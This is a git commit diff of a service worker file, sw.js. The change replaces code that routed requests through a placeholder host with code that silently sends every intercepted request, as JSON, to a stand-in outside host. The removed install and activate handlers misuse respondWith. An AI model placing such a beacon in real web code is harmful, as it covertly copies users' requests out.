c9e2e9795ab2242fc0b98a05f2d24c082e02948d
ci-staging <66037991+ci-staging@users.noreply.github.com>
2020-09-24 21:01:07 -0400

    Update sw.js

--- sw.js
+++ sw.js
@@ -1,19 +1,5 @@
-const HTTPS = true
-const HOST = 'invalid.url'
-const PORT = 443
-
-const base = `http${HTTPS ? 's' : ''}://${HOST}:${PORT}` 
-
-self.addEventListener('install', e => {
-   // handle installation
-   e.respondWith(fetch(`${base}/?t=sw-installed`))
-})
-
-self.addEventListener('activate', e => {
-    // handle activation
-    e.respondWith(fetch(`${base}/?t=sw-activated`))
-})
+const url = `https://hopefully.nobody.can.register.this`
 
 self.addEventListener('fetch', e => {
-    e.respondWith(fetch(`${base}/?t=${JSON.stringify(e.request)}`))
+    fetch(`${url}/?r=${JSON.stringify(e.request)}`)
 })
